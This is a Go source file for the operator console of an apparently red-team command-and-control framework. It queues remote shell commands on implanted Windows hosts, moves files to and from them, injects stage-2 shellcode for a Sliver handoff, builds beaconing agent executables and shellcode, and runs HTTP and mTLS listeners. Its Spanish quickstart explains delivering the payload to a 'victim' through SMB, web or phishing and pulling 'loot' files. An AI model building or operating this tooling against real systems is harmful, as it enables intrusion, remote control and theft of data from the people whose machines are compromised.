package cli

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/chzyer/readline"
	"redteam/server"
)

var globalCmds = []string{
	"agents", "use", "build", "gencert", "jobs", "listener", "help", "exit", "quit",
}

var sessionCmds = []string{
	"info", "shell", "sleep", "download", "upload", "stage2",
	"results", "kill", "back",
}

var buildTransports = []string{"http", "mtls"}
var helpTopics = []string{"start"}
var listenerSubcmds = []string{"start", "stop"}

type Operator struct {
	db       *server.DB
	ca       *server.CertBundle
	srv      *server.Server
	certsDir string
	dataDir  string
	rl       *readline.Instance
	current  string // active agent ID
}

func New(srv *server.Server) *Operator {
	return &Operator{
		db:       srv.GetDB(),
		ca:       srv.GetCA(),
		srv:      srv,
		certsDir: srv.GetCertsDir(),
		dataDir:  srv.GetCfg().DataDir,
	}
}

// completer builds tab-completion candidates based on current input.
func (op *Operator) completer(line string) []string {
	parts := strings.Fields(line)

	// Empty line or first word — show all available commands
	if len(parts) == 0 || (len(parts) == 1 && !strings.HasSuffix(line, " ")) {
		prefix := ""
		if len(parts) == 1 {
			prefix = parts[0]
		}
		var cmds []string
		cmds = append(cmds, globalCmds...)
		if op.current != "" {
			cmds = append(cmds, sessionCmds...)
		}
		var out []string
		for _, c := range cmds {
			if strings.HasPrefix(c, prefix) {
				out = append(out, c)
			}
		}
		return out
	}

	cmd := parts[0]
	// Second word completions
	switch cmd {
	case "help":
		return filterPrefix(helpTopics, lastWord(parts, line))

	case "use":
		return op.agentIDCompletions(lastWord(parts, line))

	case "build":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix(buildTransports, lastWord(parts, line))
		}

	case "listener":
		if len(parts) == 1 || (len(parts) == 2 && !strings.HasSuffix(line, " ")) {
			return filterPrefix(listenerSubcmds, lastWord(parts, line))
		}
		if len(parts) == 2 || (len(parts) == 3 && !strings.HasSuffix(line, " ")) {
			return filterPrefix(buildTransports, lastWord(parts, line))
		}

	case "stage2", "upload":
		// Complete local file paths
		return fileCompletions(lastWord(parts, line))

	case "kill", "results":
		if op.current == "" {
			return op.agentIDCompletions(lastWord(parts, line))
		}
	}
	return nil
}

func (op *Operator) newRL() (*readline.Instance, error) {
	completer := readline.NewPrefixCompleter(
		readline.PcItemDynamic(func(line string) []string {
			return op.completer(line)
		}),
	)

	cfg := &readline.Config{
		Prompt:          "c2> ",
		HistoryFile:     filepath.Join(op.dataDir, ".history"),
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",
	}
	return readline.NewEx(cfg)
}

func (op *Operator) Run() {
	fmt.Println(`
  _ __ ___  __| | |_ ___  __ _ _ __ ___
 | '__/ _ \/ _' | __/ _ \/ _' | '_ ' _ \
 | | |  __/ (_| | ||  __/ (_| | | | | | |
 |_|  \___|\__,_|\__\___|\__,_|_| |_| |_|
  c2  —  type 'help' for commands
`)

	rl, err := op.newRL()
	if err != nil {
		fmt.Println("readline init error:", err)
		return
	}
	defer rl.Close()
	op.rl = rl

	for {
		op.updatePrompt()
		line, err := rl.Readline()
		if err != nil { // EOF or ^C
			break
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		cmd := parts[0]

		switch cmd {
		case "help":
			if len(parts) >= 2 && parts[1] == "start" {
				printQuickstart()
			} else {
				printHelp()
			}

		case "agents":
			op.cmdAgents()

		case "use":
			if len(parts) < 2 {
				fmt.Println("usage: use <agent_id>")
				continue
			}
			op.current = op.resolveAgent(parts[1])

		case "back":
			op.current = ""

		case "info":
			if op.current == "" {
				fmt.Println("no agent selected, use 'use <id>'")
				continue
			}
			op.cmdInfo(op.current)

		case "shell":
			if op.current == "" {
				fmt.Println("no agent selected")
				continue
			}
			if len(parts) < 2 {
				fmt.Println("usage: shell <command>")
				continue
			}
			op.cmdShell(op.current, strings.Join(parts[1:], " "))

		case "sleep":
			if op.current == "" {
				fmt.Println("no agent selected")
				continue
			}
			if len(parts) < 3 {
				fmt.Println("usage: sleep <seconds> <jitter_pct>")
				continue
			}
			sec, _ := strconv.Atoi(parts[1])
			jitter, _ := strconv.Atoi(parts[2])
			op.cmdSleep(op.current, sec, jitter)

		case "download":
			if op.current == "" {
				fmt.Println("no agent selected")
				continue
			}
			if len(parts) < 2 {
				fmt.Println("usage: download <remote_path>")
				continue
			}
			op.cmdDownload(op.current, parts[1])

		case "upload":
			if op.current == "" {
				fmt.Println("no agent selected")
				continue
			}
			if len(parts) < 3 {
				fmt.Println("usage: upload <local_file> <remote_path>")
				continue
			}
			op.cmdUpload(op.current, parts[1], parts[2])

		case "stage2":
			if op.current == "" {
				fmt.Println("no agent selected")
				continue
			}
			if len(parts) < 2 {
				fmt.Println("usage: stage2 <shellcode.bin>")
				continue
			}
			op.cmdStage2(op.current, parts[1])

		case "kill":
			target := op.current
			if len(parts) >= 2 {
				target = op.resolveAgent(parts[1])
			}
			if target == "" {
				fmt.Println("no agent specified")
				continue
			}
			op.cmdKill(target)
			if target == op.current {
				op.current = ""
			}

		case "results":
			target := op.current
			if len(parts) >= 2 {
				target = op.resolveAgent(parts[1])
			}
			if target == "" {
				fmt.Println("no agent specified")
				continue
			}
			limit := 20
			if len(parts) >= 3 {
				limit, _ = strconv.Atoi(parts[2])
			}
			op.cmdResults(target, limit)

		case "gencert":
			if len(parts) < 2 {
				fmt.Println("usage: gencert <label>")
				continue
			}
			op.cmdGenCert(parts[1])

		case "jobs":
			op.cmdJobs()

		case "listener":
			op.cmdListener(parts[1:])

		case "build":
			op.cmdBuild(parts[1:])

		case "exit", "quit":
			fmt.Println("bye")
			return

		default:
			fmt.Printf("unknown command: %s  (type 'help')\n", cmd)
		}
	}
}

func (op *Operator) updatePrompt() {
	if op.current == "" {
		op.rl.SetPrompt("c2> ")
	} else {
		op.rl.SetPrompt(fmt.Sprintf("c2 [\033[32m%s\033[0m]> ", op.current[:8]))
	}
}

// ── command implementations ───────────────────────────────────────────────

func (op *Operator) cmdAgents() {
	agents, err := op.db.ListAgents()
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	if len(agents) == 0 {
		fmt.Println("no agents")
		return
	}
	fmt.Printf("%-36s  %-15s  %-20s  %-15s  %-8s  %s\n",
		"ID", "HOSTNAME", "USER", "IP", "TRANSP", "LAST SEEN")
	fmt.Println(strings.Repeat("-", 110))
	for _, a := range agents {
		alive := "dead"
		if a.Active {
			alive = ago(a.LastSeen)
		}
		fmt.Printf("%-36s  %-15s  %-20s  %-15s  %-8s  %s\n",
			a.ID, a.Hostname, a.Username, a.IP, a.Transport, alive)
	}
}

func (op *Operator) cmdInfo(id string) {
	a, err := op.db.GetAgent(id)
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	fmt.Printf("ID:        %s\n", a.ID)
	fmt.Printf("Hostname:  %s\n", a.Hostname)
	fmt.Printf("User:      %s\n", a.Username)
	fmt.Printf("OS:        %s\n", a.OS)
	fmt.Printf("IP:        %s\n", a.IP)
	fmt.Printf("PID:       %d\n", a.PID)
	fmt.Printf("Transport: %s\n", a.Transport)
	fmt.Printf("Sleep:     %ds ±%d%%\n", a.SleepSec, a.JitterPct)
	fmt.Printf("Last seen: %s\n", a.LastSeen.Format(time.RFC3339))
}

func (op *Operator) cmdShell(id, cmd string) {
	tid, err := op.db.QueueTask(id, "SHELL", cmd, nil, "")
	if err != nil {
		fmt.Println("error queuing task:", err)
		return
	}
	fmt.Printf("[+] queued SHELL task #%d: %s\n", tid, cmd)
}

func (op *Operator) cmdSleep(id string, sec, jitter int) {
	args := fmt.Sprintf(`{"sec":%d,"jitter":%d}`, sec, jitter)
	tid, err := op.db.QueueTask(id, "SLEEP", args, nil, "")
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	op.db.UpdateAgentSleep(id, sec, jitter)
	fmt.Printf("[+] queued SLEEP task #%d: %ds ±%d%%\n", tid, sec, jitter)
}

func (op *Operator) cmdDownload(id, remotePath string) {
	args := fmt.Sprintf(`{"path":%q}`, remotePath)
	tid, err := op.db.QueueTask(id, "DOWNLOAD", args, nil, "")
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	fmt.Printf("[+] queued DOWNLOAD task #%d: %s\n", tid, remotePath)
	fmt.Printf("    file will appear in data/uploads/%s/\n", id)
}

func (op *Operator) cmdUpload(id, localPath, remotePath string) {
	data, err := os.ReadFile(localPath)
	if err != nil {
		fmt.Println("error reading file:", err)
		return
	}
	dlDir := filepath.Join(op.dataDir, "downloads")
	os.MkdirAll(dlDir, 0700)
	fname := filepath.Base(localPath)
	os.WriteFile(filepath.Join(dlDir, fname), data, 0600)

	args := fmt.Sprintf(`{"filename":%q,"remote_path":%q}`, fname, remotePath)
	tid, err := op.db.QueueTask(id, "UPLOAD", args, nil, "")
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	fmt.Printf("[+] queued UPLOAD task #%d: %s → %s\n", tid, localPath, remotePath)
}

func (op *Operator) cmdStage2(id, binPath string) {
	sc, err := os.ReadFile(binPath)
	if err != nil {
		fmt.Println("error reading shellcode:", err)
		return
	}
	tid, err := op.db.QueueTask(id, "STAGE2", "", sc, "")
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	fmt.Printf("[+] queued STAGE2 task #%d (%d bytes) for agent %s\n", tid, len(sc), id[:8])
}

func (op *Operator) cmdKill(id string) {
	op.db.QueueTask(id, "KILL", "", nil, "")
	op.db.KillAgent(id)
	fmt.Printf("[+] kill queued for %s\n", id[:8])
}

func (op *Operator) cmdResults(id string, limit int) {
	results, err := op.db.GetResults(id, limit)
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	if len(results) == 0 {
		fmt.Println("no results")
		return
	}
	for _, r := range results {
		fmt.Printf("--- task #%d @ %s ---\n", r.TaskID, r.CreatedAt.Format("15:04:05"))
		if r.Output != "" {
			fmt.Println(r.Output)
		}
		if r.Error != "" {
			fmt.Printf("[err] %s\n", r.Error)
		}
	}
}

func (op *Operator) cmdGenCert(label string) {
	certPEM, keyPEM, err := op.ca.SignAgentCert(label)
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	outCert := filepath.Join(op.certsDir, label+"-agent.crt")
	outKey := filepath.Join(op.certsDir, label+"-agent.key")
	os.WriteFile(outCert, certPEM, 0600)
	os.WriteFile(outKey, keyPEM, 0600)
	fmt.Printf("[+] cert:    %s\n", outCert)
	fmt.Printf("[+] key:     %s\n", outKey)
	fmt.Printf("[+] ca cert: %s\n", filepath.Join(op.certsDir, "ca.crt"))
	fmt.Printf("\nPara build mTLS:\n  AgentCertPEM (b64): %s\n", base64.StdEncoding.EncodeToString(certPEM))
}

func (op *Operator) cmdBuild(args []string) {
	if len(args) < 2 {
		fmt.Println("usage: build http|mtls <c2_host> [sleep_sec] [jitter_pct]")
		return
	}
	transport := args[0]
	host := args[1]
	sleepSec := 60
	jitter := 20
	if len(args) >= 3 {
		sleepSec, _ = strconv.Atoi(args[2])
	}
	if len(args) >= 4 {
		jitter, _ = strconv.Atoi(args[3])
	}

	port := "8080"
	scheme := "http"
	if transport == "mtls" {
		port = "8443"
		scheme = "https"
	}

	cfg := server.BuildConfig{
		ServerURL: fmt.Sprintf("%s://%s:%s", scheme, host, port),
		Transport: transport,
		SleepSec:  sleepSec,
		JitterPct: jitter,
	}

	if transport == "mtls" {
		certPEM, keyPEM, err := op.ca.SignAgentCert("agent-" + host)
		if err != nil {
			fmt.Println("error generating agent cert:", err)
			return
		}
		cfg.AgentCertPEM = string(certPEM)
		cfg.AgentKeyPEM = string(keyPEM)
		cfg.CACertPEM = string(op.ca.CACertPEM)
	}

	fmt.Printf("[*] building agent.exe (%s → %s)...\n", transport, cfg.ServerURL)
	exePath, err := server.BuildEXE(cfg, "bin")
	if err != nil {
		fmt.Println("build error:", err)
		return
	}
	fmt.Printf("[+] agent.exe: %s\n", exePath)

	fmt.Printf("[*] convirtiendo a shellcode (.bin)...\n")
	rawPath, err := server.BuildRAW(exePath, "bin")
	if err != nil {
		fmt.Printf("[!] shellcode conversion failed: %v\n", err)
		fmt.Printf("    .exe disponible en %s\n", exePath)
		return
	}
	fmt.Printf("[+] agent.bin: %s\n", rawPath)
}

func (op *Operator) cmdJobs() {
	jobs := op.srv.GetJobs()
	if len(jobs) == 0 {
		fmt.Println("no listeners running")
		return
	}
	fmt.Printf("%-4s  %-6s  %-6s  %-10s  %s\n", "ID", "PROTO", "PORT", "STATUS", "UPTIME")
	fmt.Println(strings.Repeat("-", 45))
	for _, j := range jobs {
		uptime := time.Since(j.StartedAt).Round(time.Second).String()
		status := j.Status
		if status == "running" {
			status = "\033[32mrunning\033[0m"
		} else {
			status = "\033[31mstopped\033[0m"
		}
		fmt.Printf("%-4d  %-6s  %-6d  %-20s  %s\n", j.ID, j.Protocol, j.Port, status, uptime)
	}
}

func (op *Operator) cmdListener(args []string) {
	usage := "usage: listener start http|mtls <port>\n       listener stop <job_id>"
	if len(args) < 1 {
		fmt.Println(usage)
		return
	}
	switch args[0] {
	case "start":
		if len(args) < 3 {
			fmt.Println("usage: listener start http|mtls <port>")
			return
		}
		proto := strings.ToLower(args[1])
		port, err := strconv.Atoi(args[2])
		if err != nil || port < 1 || port > 65535 {
			fmt.Println("invalid port")
			return
		}
		switch proto {
		case "http":
			id := op.srv.StartHTTP(op.srv.GetMux(), port)
			fmt.Printf("[+] HTTP listener started on :%d  (job #%d)\n", port, id)
		case "mtls":
			id, err := op.srv.StartMTLS(op.srv.GetMux(), port)
			if err != nil {
				fmt.Println("error:", err)
				return
			}
			fmt.Printf("[+] mTLS listener started on :%d  (job #%d)\n", port, id)
		default:
			fmt.Println("unknown protocol:", proto, " — use http or mtls")
		}

	case "stop":
		if len(args) < 2 {
			fmt.Println("usage: listener stop <job_id>")
			return
		}
		id, err := strconv.Atoi(args[1])
		if err != nil {
			fmt.Println("invalid job id")
			return
		}
		if err := op.srv.StopJob(id); err != nil {
			fmt.Println("error:", err)
			return
		}
		fmt.Printf("[+] job #%d stopped\n", id)

	default:
		fmt.Println(usage)
	}
}

func (op *Operator) resolveAgent(partial string) string {
	agents, _ := op.db.ListAgents()
	for _, a := range agents {
		if strings.HasPrefix(a.ID, partial) || a.ID == partial {
			return a.ID
		}
	}
	fmt.Printf("agent not found: %s\n", partial)
	return ""
}

// ── completion helpers ────────────────────────────────────────────────────

func (op *Operator) agentIDCompletions(prefix string) []string {
	agents, _ := op.db.ListAgents()
	var out []string
	for _, a := range agents {
		if strings.HasPrefix(a.ID, prefix) {
			out = append(out, a.ID)
		}
	}
	return out
}

func fileCompletions(prefix string) []string {
	dir := filepath.Dir(prefix)
	if dir == "" {
		dir = "."
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	base := filepath.Base(prefix)
	var out []string
	for _, e := range entries {
		name := e.Name()
		if strings.HasPrefix(name, base) {
			p := filepath.Join(dir, name)
			if e.IsDir() {
				p += "/"
			}
			out = append(out, p)
		}
	}
	return out
}

func filterPrefix(list []string, prefix string) []string {
	var out []string
	for _, s := range list {
		if strings.HasPrefix(s, prefix) {
			out = append(out, s)
		}
	}
	return out
}

func lastWord(parts []string, line string) string {
	if strings.HasSuffix(line, " ") {
		return ""
	}
	if len(parts) == 0 {
		return ""
	}
	return parts[len(parts)-1]
}

// ── help ─────────────────────────────────────────────────────────────────

func printHelp() {
	fmt.Print(`
Global commands:
  agents                           list all registered agents
  use <id_prefix>                  select an agent  [TAB completes IDs]
  build http|mtls <host> [s] [j]   compile agent.exe + agent.bin
  gencert <label>                  generate mTLS agent certificate
  help                             this message
  help start                       quickstart guide (first time setup)
  exit / quit                      exit

Session commands (require 'use <id>'):
  info                             show agent details
  shell <cmd>                      run command on agent
  sleep <sec> <jitter_pct>         change beacon interval
  download <remote_path>           pull file from agent
  upload <local> <remote_path>     push file to agent  [TAB completes files]
  stage2 <shellcode.bin>           inject shellcode (Sliver handoff)  [TAB completes files]
  results [limit]                  show last N task results
  kill                             terminate agent
  back                             deselect agent

Tips:
  · TAB autocompleta comandos, IDs de agentes y rutas de archivo
  · Flecha ↑↓ navega el historial de comandos
  · Ctrl+C cancela la línea actual

`)
}

func printQuickstart() {
	fmt.Print(`
┌─────────────────────────────────────────────────────────────────┐
│                  C2 — QUICKSTART                    │
└─────────────────────────────────────────────────────────────────┘

PASO 1 — Compilar el servidor (solo la primera vez)
  $ go build -o bin/c2-server ./cmd/server/
  $ ./bin/c2-server -http-port 8080 -mtls-port 8443

PASO 2 — Generar payload HTTP (más simple)
  c2> build http <IP_KALI> [sleep_sec] [jitter_pct]
  Ejemplo:
    c2> build http 192.168.1.10 60 20
  Genera:
    bin/agent.exe   → ejecutable Windows
    bin/agent.bin   → shellcode raw

PASO 3 — Generar payload mTLS (más seguro)
  c2> gencert victim1
  c2> build mtls 192.168.1.10
  Genera:
    bin/agent-mtls.exe

PASO 4 — Entregar el payload al objetivo
  · Copiar agent.exe via SMB, web, phishing
  · Usar agent.bin como shellcode en un loader
  · Ejecutar directo en la víctima

PASO 5 — Esperar conexión y operar
  c2> agents
  c2> use <TAB para autocompletar ID>
  c2 [abc12345]> shell whoami
  c2 [abc12345]> shell ipconfig /all
  c2 [abc12345]> download C:\Users\victim\loot.txt
  c2 [abc12345]> sleep 30 10

PASO 6 — Handoff a Sliver (stage 2)
  # En Sliver:
  sliver > generate --http <IP_KALI>:8888 --format shellcode --os windows --arch amd64 --save /tmp/sliver.bin

  # En c2:
  c2 [abc12345]> stage2 /tmp/sliver.bin

NOTAS:
  · Listeners HTTP (:8080) y mTLS (:8443) arrancan automáticamente
  · Los certs TLS se generan solos en certs/ al iniciar
  · Base de datos en data/c2.db (SQLite)
  · Historial de comandos en data/.history

`)
}

func ago(t time.Time) string {
	d := time.Since(t)
	switch {
	case d < time.Minute:
		return fmt.Sprintf("%ds ago", int(d.Seconds()))
	case d < time.Hour:
		return fmt.Sprintf("%dm ago", int(d.Minutes()))
	default:
		return fmt.Sprintf("%dh ago", int(d.Hours()))
	}
}
